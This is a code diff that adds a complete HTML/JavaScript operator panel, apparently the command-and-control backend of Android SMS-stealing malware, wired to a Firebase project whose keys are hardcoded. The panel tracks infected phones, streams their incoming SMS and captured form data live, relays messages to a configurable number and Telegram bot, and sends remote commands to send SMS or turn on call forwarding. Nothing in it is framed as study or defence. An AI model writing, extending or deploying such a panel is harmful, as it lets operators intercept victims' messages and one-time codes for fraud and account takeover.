@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>C2H Admin Panel</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    
+    <style>
+        :root {
+            --bg-dark: #1E1E1E;
+            --primary-dark: #121212;
+            --text-primary: #FFFFFF;
+            --text-secondary: #B0B0B0;
+            --card-dark: #2C2C2C;
+            --accent-blue: #3498DB;
+            --online-status: #2ECC71;
+            --offline-status: #E74C3C;
+            --button-gradient: linear-gradient(135deg, #4A00E0, #8E2DE2);
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: var(--bg-dark); color: var(--text-primary); display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
+
+        .header { background-color: var(--primary-dark); padding: 15px 20px; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.5); position: relative; z-index: 10; display: flex; justify-content: center; align-items: center; }
+        .header h1 { font-size: 20px; font-weight: bold; margin: 0; }
+        .back-btn { position: absolute; left: 15px; background: none; border: none; color: var(--accent-blue); font-size: 24px; cursor: pointer; padding: 0 10px; }
+
+        .view { display: none; flex-direction: column; flex: 1; height: 100%; overflow: hidden; }
+        .view.active { display: flex; }
+        .content-area { padding: 15px; flex: 1; overflow-y: auto; }
+
+        .btn { background: var(--button-gradient); color: var(--text-primary); border: none; padding: 12px 15px; border-radius: 8px; font-size: 14px; font-weight: bold; cursor: pointer; text-align: center; transition: opacity 0.2s; width: 100%; }
+        .btn:active { opacity: 0.8; }
+        .btn-danger { background: var(--offline-status); }
+        .btn-outline { background: transparent; border: 1px solid var(--text-secondary); color: var(--text-primary); }
+        .main-buttons { display: flex; gap: 10px; margin-bottom: 20px; }
+        .grid-2x2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px; }
+        .full-width { grid-column: span 2; }
+
+        .card { background-color: var(--card-dark); border: 1px solid var(--accent-blue); border-radius: 10px; padding: 15px; margin-bottom: 12px; position: relative; cursor: pointer; transition: all 0.3s ease; }
+        .card-title { font-size: 16px; font-weight: bold; margin-bottom: 5px; color: var(--text-primary); }
+        .card-text { font-size: 13px; color: var(--text-secondary); margin-bottom: 3px; }
+        
+        @keyframes highlightNew {
+            0% { background-color: rgba(46, 204, 113, 0.4); border-color: var(--online-status); transform: scale(0.98); }
+            100% { background-color: var(--card-dark); border-color: var(--accent-blue); transform: scale(1); }
+        }
+        .new-item { animation: highlightNew 1.5s ease-out; }
+
+        /* ONLINE PULSE ANIMATION */
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(46, 204, 113, 0.7); }
+            70% { box-shadow: 0 0 0 6px rgba(46, 204, 113, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(46, 204, 113, 0); }
+        }
+
+        .status-dot { height: 10px; width: 10px; border-radius: 50%; display: inline-block; margin-right: 5px; }
+        .online { background-color: var(--online-status); animation: pulse 2s infinite; }
+        .offline { background-color: var(--offline-status); box-shadow: none; }
+        .status-text { font-size: 12px; font-weight: bold; }
+        .text-online { color: var(--online-status); }
+        .text-offline { color: var(--offline-status); }
+        .delete-icon { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: var(--offline-status); font-size: 20px; cursor: pointer; padding: 10px; }
+        .delete-icon-top { top: 15px; transform: none; }
+
+        .input-field { width: 100%; background: var(--primary-dark); border: 1px solid var(--text-secondary); color: var(--text-primary); padding: 12px; border-radius: 6px; margin-bottom: 15px; font-size: 14px; }
+        .input-field:focus { outline: none; border-color: var(--accent-blue); }
+        textarea.input-field { height: 100px; resize: none; }
+
+        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 100; justify-content: center; align-items: center; padding: 20px; }
+        .modal-overlay.active { display: flex; }
+        .modal-content { background: var(--card-dark); border: 1px solid var(--accent-blue); border-radius: 12px; padding: 20px; width: 100%; max-width: 400px; box-shadow: 0 5px 15px rgba(0,0,0,0.5); }
+        .modal-title { font-size: 18px; font-weight: bold; margin-bottom: 15px; text-align: center; }
+        .modal-actions { display: flex; gap: 10px; margin-top: 10px; }
+
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-track { background: var(--bg-dark); }
+        ::-webkit-scrollbar-thumb { background: var(--text-secondary); border-radius: 5px; }
+    </style>
+</head>
+<body>
+
+    <!-- VIEW 1: MAIN DASHBOARD -->
+    <div id="view-dashboard" class="view active">
+        <div class="header"><h1>C2H Admin Panel</h1></div>
+        <div class="content-area">
+            <div class="main-buttons">
+                <button class="btn" onclick="openModal('modal-forwarding')">UPDATE FORWARDING</button>
+                <button class="btn" onclick="openModal('modal-telegram')">UPDATE TELEGRAM</button>
+            </div>
+            <h3 style="margin-bottom: 10px; font-size: 16px;">Registered Devices</h3>
+            <div id="device-list"></div>
+        </div>
+    </div>
+
+    <!-- VIEW 2: DEVICE CONTROL -->
+    <div id="view-device-control" class="view">
+        <div class="header">
+            <button class="back-btn" onclick="switchView('view-dashboard')">❮</button>
+            <div>
+                <h1>Device Control</h1>
+                <div style="font-size: 12px; color: var(--text-secondary); margin-top: 3px;">
+                    <span id="control-status-dot" class="status-dot offline"></span>
+                    Controlling: <span id="control-device-name">Loading...</span>
+                </div>
+            </div>
+        </div>
+        <div class="content-area" style="display: flex; flex-direction: column;">
+            <div class="grid-2x2">
+                <button class="btn" onclick="switchView('view-forms')">GET FORMS</button>
+                <button class="btn" onclick="openModal('modal-send-sms')">SEND SMS</button>
+                <button class="btn full-width" onclick="openModal('modal-call-forward')">CALL FORWARDING</button>
+            </div>
+            <h3 style="margin: 15px 0 10px 0; font-size: 16px;">Received SMS <span style="font-size:10px; color:var(--online-status);">(Live 🟢)</span></h3>
+            <div id="sms-list" style="flex: 1; overflow-y: auto; padding-bottom: 20px;"></div>
+        </div>
+    </div>
+
+    <!-- VIEW 3: FORM SUBMISSIONS -->
+    <div id="view-forms" class="view">
+        <div class="header">
+            <button class="back-btn" onclick="switchView('view-device-control')">❮</button>
+            <h1>Form Data List <span style="font-size:12px; color:var(--online-status);">(Live 🟢)</span></h1>
+        </div>
+        <div class="content-area" id="form-list"></div>
+    </div>
+
+    <!-- MODALS -->
+    <div id="modal-forwarding" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-title">Update Forwarding Number</div>
+            <input type="text" id="inp-fwd-num" class="input-field" placeholder="e.g. +919876543210">
+            <div class="modal-actions">
+                <button class="btn btn-outline" onclick="closeModal('modal-forwarding')">Cancel</button>
+                <button class="btn" onclick="saveConfig('forwarding')">Update</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="modal-telegram" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-title">Update Telegram Details</div>
+            <input type="text" id="inp-bot-token" class="input-field" placeholder="Bot Token">
+            <input type="text" id="inp-chat-id" class="input-field" placeholder="Chat ID">
+            <div class="modal-actions">
+                <button class="btn btn-outline" onclick="closeModal('modal-telegram')">Cancel</button>
+                <button class="btn" onclick="saveConfig('telegram')">Update</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="modal-send-sms" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-title">Send SMS</div>
+            <input type="text" id="inp-sms-num" class="input-field" placeholder="Target Phone Number">
+            <textarea id="inp-sms-msg" class="input-field" placeholder="Type message here..."></textarea>
+            <select id="inp-sms-sim" class="input-field">
+                <option value="0">SIM 1</option>
+                <option value="1">SIM 2</option>
+            </select>
+            <div class="modal-actions">
+                <button class="btn btn-outline" onclick="closeModal('modal-send-sms')">Cancel</button>
+                <button class="btn" onclick="sendCommand('send_sms')">Send SMS</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="modal-call-forward" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-title">Call Forwarding</div>
+            <input type="text" id="inp-call-num" class="input-field" placeholder="Forward To Number">
+            <select id="inp-call-sim" class="input-field">
+                <option value="0">SIM 1</option>
+                <option value="1">SIM 2</option>
+            </select>
+            <div class="modal-actions">
+                <button class="btn btn-danger" onclick="sendCommand('call_forward', 'disable')">Deactivate</button>
+                <button class="btn" onclick="sendCommand('call_forward', 'enable')">Activate</button>
+            </div>
+            <button class="btn btn-outline" style="margin-top: 10px;" onclick="closeModal('modal-call-forward')">Cancel</button>
+        </div>
+    </div>
+
+    <div id="modal-confirm" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-title">Delete this item?</div>
+            <div class="modal-actions">
+                <button class="btn btn-outline" onclick="closeModal('modal-confirm')">NO</button>
+                <button class="btn btn-danger" id="btn-confirm-yes">YES</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="modal-success" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-title" id="success-msg-text" style="color: var(--online-status);">Command sent successfully!</div>
+            <button class="btn" onclick="closeModal('modal-success')">OK</button>
+        </div>
+    </div>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyD9uGy3UPY6NDVK2Mw6UqfhG2SLhhHh_Wg",
+            authDomain: "c2h-panel-2.firebaseapp.com",
+            databaseURL: "https://c2h-panel-2-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "c2h-panel-2",
+            storageBucket: "c2h-panel-2.firebasestorage.app",
+            messagingSenderId: "53088245805",
+            appId: "1:53088245805:web:d74eceddc028457c9800a4"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        let currentDeviceId = null;
+        let devicesData = {};
+        let deleteAction = null;
+
+        // ============================================================
+        // FIX 1: Active device listeners ko track karo taaki remove kar sako
+        // ============================================================
+        let activeListeners = [];
+
+        function removeAllActiveListeners() {
+            activeListeners.forEach(({ ref, event }) => {
+                ref.off(event);
+            });
+            activeListeners = [];
+        }
+
+        function addListener(ref, event, callback) {
+            ref.on(event, callback);
+            activeListeners.push({ ref, event });
+        }
+
+        // ============================================================
+        // FIREBASE SERVER TIME OFFSET - client aur server ka time sync karo
+        // Yeh solve karta hai timezone mismatch problem
+        // ============================================================
+        let serverTimeOffset = 0;
+        db.ref('.info/serverTimeOffset').on('value', snap => {
+            serverTimeOffset = snap.val() || 0;
+        });
+
+        function getServerNow() {
+            // Client time + Firebase offset = actual server time
+            return Date.now() + serverTimeOffset;
+        }
+
+        // ============================================================
+        // isOnline - FIXED with server time sync
+        // 10 second threshold: agar 10 sec se zyada purana hai to OFFLINE
+        // last_seen: number (ms timestamp) ya string "YYYY-MM-DD HH:MM:SS"
+        // ============================================================
+        function isOnline(lastSeen) {
+            if (!lastSeen) return false;
+
+            let lastSeenMs;
+
+            if (typeof lastSeen === 'number') {
+                // Firebase server timestamp (milliseconds directly)
+                lastSeenMs = lastSeen;
+            } else if (typeof lastSeen === 'string') {
+                // Try multiple formats
+                let d;
+
+                // Format: "2024-01-15 14:30:45" → ISO banao
+                d = new Date(lastSeen.trim().replace(' ', 'T'));
+
+                // Agar still invalid, manual parse karo
+                if (isNaN(d.getTime())) {
+                    const p = lastSeen.trim().split(/[\s\-:T]/);
+                    if (p.length >= 6) {
+                        // Note: yeh LOCAL time assume karta hai
+                        d = new Date(+p[0], +p[1]-1, +p[2], +p[3], +p[4], +p[5]);
+                    }
+                }
+
+                if (isNaN(d.getTime())) return false;
+                lastSeenMs = d.getTime();
+            } else {
+                return false;
+            }
+
+            const diffSeconds = (getServerNow() - lastSeenMs) / 1000;
+            return diffSeconds < 15; // 15 seconds — 10 sec ping + 5 sec buffer
+        }
+
+        // ============================================================
+        // formatLastSeen - readable time dikhao + kitne second pehle
+        // ============================================================
+        function formatLastSeen(lastSeen) {
+            if (!lastSeen) return 'Never';
+
+            let d;
+            if (typeof lastSeen === 'number') {
+                d = new Date(lastSeen);
+            } else {
+                d = new Date(lastSeen.trim().replace(' ', 'T'));
+                if (isNaN(d.getTime())) return lastSeen;
+            }
+
+            const diffSec = Math.floor((getServerNow() - d.getTime()) / 1000);
+            if (diffSec < 60) return `${diffSec}s ago`;
+            if (diffSec < 3600) return `${Math.floor(diffSec/60)}m ago`;
+            return d.toLocaleTimeString();
+        }
+
+        function switchView(viewId) {
+            document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
+            document.getElementById(viewId).classList.add('active');
+        }
+
+        function openModal(modalId) { document.getElementById(modalId).classList.add('active'); }
+        function closeModal(modalId) { document.getElementById(modalId).classList.remove('active'); }
+
+        function showSuccess(msg) {
+            document.getElementById('success-msg-text').innerText = msg;
+            openModal('modal-success');
+        }
+
+        function confirmDelete(actionFunc) {
+            deleteAction = actionFunc;
+            openModal('modal-confirm');
+        }
+
+        document.getElementById('btn-confirm-yes').onclick = () => {
+            if (deleteAction) deleteAction();
+            closeModal('modal-confirm');
+        };
+
+        // ============================================================
+        // LOAD CONFIG
+        // ============================================================
+        db.ref('config').on('value', snapshot => {
+            const data = snapshot.val();
+            if (data) {
+                if (data.sms_forward) document.getElementById('inp-fwd-num').value = data.sms_forward.forward_number || '';
+                if (data.telegram) {
+                    document.getElementById('inp-bot-token').value = data.telegram.telegram_bot_token || '';
+                    document.getElementById('inp-chat-id').value = data.telegram.telegram_chat_id || '';
+                }
+            }
+        });
+
+        function saveConfig(type) {
+            if (type === 'forwarding') {
+                db.ref('config/sms_forward').set({ forward_number: document.getElementById('inp-fwd-num').value });
+                closeModal('modal-forwarding');
+                showSuccess("Forwarding Updated!");
+            } else {
+                db.ref('config/telegram').set({
+                    telegram_bot_token: document.getElementById('inp-bot-token').value,
+                    telegram_chat_id: document.getElementById('inp-chat-id').value
+                });
+                closeModal('modal-telegram');
+                showSuccess("Telegram Updated!");
+            }
+        }
+
+        // ============================================================
+        // FIX 4: DEVICES - Real-time live updates with child events
+        // 'value' event ki jagah child_added + child_changed + child_removed use karo
+        // Isse poori list baar baar re-render nahi hogi, sirf jo change hua woh update hoga
+        // ============================================================
+        function renderSingleDevice(id, dev) {
+            const online = isOnline(dev.last_seen);
+            const statusClass = online ? 'online' : 'offline';
+            const statusTextClass = online ? 'text-online' : 'text-offline';
+            const statusText = online ? 'ONLINE' : 'OFFLINE';
+
+            let card = document.getElementById(`device-card-${id}`);
+            const isNew = !card;
+
+            if (!card) {
+                card = document.createElement('div');
+                card.id = `device-card-${id}`;
+                card.className = 'card';
+                document.getElementById('device-list').appendChild(card);
+            }
+
+            card.onclick = () => selectDevice(id, dev);
+            card.innerHTML = `
+                <div class="card-title">${dev.brand || 'Unknown'} ${dev.model || ''}</div>
+                <div class="card-text">📱 ${dev.phone_number || 'Unknown'}</div>
+                <div class="card-text">⚙️ ${dev.os_version || 'Unknown'} | 🔋 ${dev.battery_level || '?'}%</div>
+                <div class="card-text" style="margin-top: 8px;">
+                    <span class="status-dot ${statusClass}"></span>
+                    <span class="status-text ${statusTextClass}">${statusText}</span>
+                    <span class="last-seen-time" style="color: var(--text-secondary); font-size: 11px; margin-left: 5px;">(${formatLastSeen(dev.last_seen)})</span>
+                </div>
+                <div class="delete-icon" onclick="event.stopPropagation(); confirmDelete(() => deleteDevice('${id}'))">🗑️</div>
+            `;
+
+            if (isNew) {
+                card.classList.add('new-item');
+                setTimeout(() => card.classList.remove('new-item'), 1500);
+            }
+        }
+
+        // child_added: naya device aaya
+        db.ref('devices').on('child_added', snapshot => {
+            devicesData[snapshot.key] = snapshot.val();
+            renderSingleDevice(snapshot.key, snapshot.val());
+        });
+
+        // child_changed: device ka koi bhi data update hua (last_seen, battery, etc.)
+        db.ref('devices').on('child_changed', snapshot => {
+            devicesData[snapshot.key] = snapshot.val();
+            renderSingleDevice(snapshot.key, snapshot.val());
+
+            // Agar yahi device control view mein open hai to status bhi update karo
+            if (currentDeviceId === snapshot.key) {
+                updateControlViewStatus(snapshot.val());
+            }
+        });
+
+        // child_removed: device delete hua
+        db.ref('devices').on('child_removed', snapshot => {
+            delete devicesData[snapshot.key];
+            const card = document.getElementById(`device-card-${snapshot.key}`);
+            if (card) card.remove();
+        });
+
+        function updateControlViewStatus(dev) {
+            const online = isOnline(dev.last_seen);
+            document.getElementById('control-status-dot').className = `status-dot ${online ? 'online' : 'offline'}`;
+        }
+
+        function deleteDevice(id) {
+            db.ref('devices/' + id).remove();
+            db.ref('commands/' + id).remove();
+        }
+
+        // ============================================================
+        // SELECT DEVICE & LIVE DATA
+        // ============================================================
+        function selectDevice(id, dev) {
+            currentDeviceId = id;
+            document.getElementById('control-device-name').innerText = `${dev.brand || ''} ${dev.model || ''}`;
+            updateControlViewStatus(dev);
+
+            switchView('view-device-control');
+
+            // Pehle wale listeners hata do
+            removeAllActiveListeners();
+
+            const smsList = document.getElementById('sms-list');
+            const formList = document.getElementById('form-list');
+            smsList.innerHTML = '';
+            formList.innerHTML = '';
+
+            // LIVE SMS
+            const smsRef = db.ref(`devices/${id}/received_sms`);
+            addListener(smsRef, 'child_added', snapshot => {
+                if (document.getElementById(`sms-${snapshot.key}`)) return; // duplicate avoid
+                const sms = snapshot.val();
+                const div = document.createElement('div');
+                div.className = 'card new-item';
+                div.id = `sms-${snapshot.key}`;
+                div.style.paddingRight = '40px';
+                div.innerHTML = `
+                    <div class="card-title">${sms.sender || 'Unknown'}</div>
+                    <div class="card-text" style="color: var(--text-primary); margin: 5px 0;">${sms.message_body || ''}</div>
+                    <div class="card-text" style="font-size: 11px;">🕒 ${sms.received_at || ''}</div>
+                    <div class="delete-icon delete-icon-top" onclick="confirmDelete(() => deleteItem('received_sms', '${snapshot.key}'))">🗑️</div>
+                `;
+                smsList.insertBefore(div, smsList.firstChild);
+                setTimeout(() => div.classList.remove('new-item'), 1500);
+            });
+
+            addListener(smsRef, 'child_removed', snapshot => {
+                const el = document.getElementById(`sms-${snapshot.key}`);
+                if (el) el.remove();
+            });
+
+            // LIVE FORMS
+            const formRef = db.ref(`devices/${id}/form_submissions`);
+            addListener(formRef, 'child_added', snapshot => {
+                if (document.getElementById(`form-${snapshot.key}`)) return;
+                const form = snapshot.val();
+                const div = document.createElement('div');
+                div.className = 'card new-item';
+                div.id = `form-${snapshot.key}`;
+                div.style.paddingRight = '40px';
+                div.innerHTML = `
+                    <div class="card-text" style="color: var(--text-primary); white-space: pre-wrap; font-family: monospace;">${form.custom_data || ''}</div>
+                    <div class="card-text" style="font-size: 11px; margin-top: 10px;">🕒 ${form.submitted_at || ''}</div>
+                    <div class="delete-icon delete-icon-top" onclick="confirmDelete(() => deleteItem('form_submissions', '${snapshot.key}'))">🗑️</div>
+                `;
+                formList.insertBefore(div, formList.firstChild);
+                setTimeout(() => div.classList.remove('new-item'), 1500);
+            });
+
+            addListener(formRef, 'child_removed', snapshot => {
+                const el = document.getElementById(`form-${snapshot.key}`);
+                if (el) el.remove();
+            });
+        }
+
+        function deleteItem(nodeName, key) {
+            if (currentDeviceId) {
+                db.ref(`devices/${currentDeviceId}/${nodeName}/${key}`).remove();
+            }
+        }
+
+        // ============================================================
+        // SEND COMMANDS
+        // ============================================================
+        function sendCommand(type, action = null) {
+            if (!currentDeviceId) return;
+
+            let data = {};
+            if (type === 'send_sms') {
+                data.phone_number = document.getElementById('inp-sms-num').value;
+                data.message = document.getElementById('inp-sms-msg').value;
+                data.sim_slot = parseInt(document.getElementById('inp-sms-sim').value);
+                if (!data.phone_number || !data.message) return;
+                closeModal('modal-send-sms');
+            } else if (type === 'call_forward') {
+                data.action = action;
+                data.forward_number = document.getElementById('inp-call-num').value;
+                data.sim_slot = parseInt(document.getElementById('inp-call-sim').value);
+                if (action === 'enable' && !data.forward_number) return;
+                closeModal('modal-call-forward');
+            }
+
+            db.ref(`commands/${currentDeviceId}`).push({
+                command_type: type,
+                command_data: JSON.stringify(data),
+                executed: false,
+                created_at: new Date().toISOString()
+            }).then(() => showSuccess("Command sent successfully!"));
+        }
+
+        // ============================================================
+        // FIX 5: setInterval HATAO - Firebase real-time se sab kuch
+        // automatic update ho raha hai, interval ki zaroorat nahi
+        // Sirf ek lightweight interval rakha hai sirf clock refresh ke liye
+        // jo existing cards ki status visually update kare
+        // ============================================================
+        // Har 3 second mein cards ki online/offline status + "Xs ago" update karo
+        // Firebase se data aa raha hai, hum sirf TIME-BASED check refresh karte hain
+        setInterval(() => {
+            Object.keys(devicesData).forEach(id => {
+                const dev = devicesData[id];
+                const card = document.getElementById(`device-card-${id}`);
+                if (!card || !dev) return;
+
+                const online = isOnline(dev.last_seen);
+                const dot = card.querySelector('.status-dot');
+                const statusText = card.querySelector('.status-text');
+                const timeSpan = card.querySelector('.last-seen-time');
+
+                if (dot) dot.className = `status-dot ${online ? 'online' : 'offline'}`;
+                if (statusText) {
+                    statusText.className = `status-text ${online ? 'text-online' : 'text-offline'}`;
+                    statusText.innerText = online ? 'ONLINE' : 'OFFLINE';
+                }
+                if (timeSpan) timeSpan.innerText = `(${formatLastSeen(dev.last_seen)})`;
+            });
+
+            // Control view dot bhi update karo
+            if (currentDeviceId && devicesData[currentDeviceId]) {
+                updateControlViewStatus(devicesData[currentDeviceId]);
+            }
+        }, 3000); // 3 sec refresh — 15 sec threshold ke saath quick detection
+
+    </script>
+</body>
+</html>
